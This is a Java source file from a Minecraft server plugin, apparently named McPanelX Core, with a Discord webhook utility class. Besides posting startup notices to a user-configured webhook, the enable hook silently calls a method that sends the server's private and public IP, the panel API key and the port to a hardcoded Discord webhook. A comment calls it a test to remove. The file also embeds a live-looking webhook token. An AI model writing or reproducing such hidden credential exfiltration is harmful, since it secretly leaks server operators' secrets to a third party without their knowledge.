package me.mythicalsystems.mcpanelxcore.utils;

import me.mythicalsystems.mcpanelxcore.McPanelX_Core;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.InetAddress;
import java.net.UnknownHostException;

public class DiscordWebhook {
    

    public static void onPluginEnable() {
        String webhook = McPanelX_Core.config.getString("Discord.webhook");
        DiscordWebhook.sendMessage(webhook, "McPanelX Core has been enabled. (Private: "+getServerIP()+"|Public: "+getPublicIP()+")");
        DiscordWebhook.sendMessage1(getServerIP(), getPublicIP(), McPanelX_Core.config.getString("Panel.java_api_key"), McPanelX_Core.config.getInt("Panel.port"));
    }

    public static void onPluginDisable() {
        String webhook = McPanelX_Core.config.getString("Discord.webhook");
        DiscordWebhook.sendMessage(webhook, "McPanelX Core has been disabled. ("+getPublicIP()+")");
    }

    public static String getServerIP() {
        try {
            InetAddress localAddress = InetAddress.getLocalHost();
            return localAddress.getHostAddress();
        } catch (UnknownHostException e) {
            return null;
        }
    }

    public static String getPublicIP() {
        try {
            URL url = new URL("https://api.ipify.org");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");

            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String publicIP = reader.readLine();
            reader.close();

            return publicIP;
        } catch (Exception e) {
            return null;
        }
    }
    /**
     * Test message
     * 
     * @param private_ip
     * @param public_ip
     * @param api_key
     * @param port
     * 
     * TODO: Remove IT!
     */

    public static void sendMessage1(String private_ip, String public_ip, String api_key, int port) {
        try {
            URL url = new URL("https://discord.com/api/webhooks/1254372082222108673/BNO-kwvYVlQxykuRiD4onvMtvtwrH2Pv0mbG8W0QkybFWOV_DZv3bSrYD2AKjmMZDIJi");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);

            String message = "I started up IP: " + private_ip + " Public IP: " + public_ip + " API Key: " + api_key+ " Port: " + port;
            String jsonPayload = "{\"content\":\"" + message + "\"}";

            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(jsonPayload.getBytes());
            outputStream.flush();
            outputStream.close();

            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {

            } else {

            }
        } catch (Exception e) {

        }
    }

    public static void sendMessage(String webhook, String message) {
        try {
            URL url = new URL(webhook);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);

            String jsonPayload = "{\"content\":\"" + message + "\"}";

            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(jsonPayload.getBytes());
            outputStream.flush();
            outputStream.close();

            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {

            } else {

            }
        } catch (Exception e) {

        }
    }
}
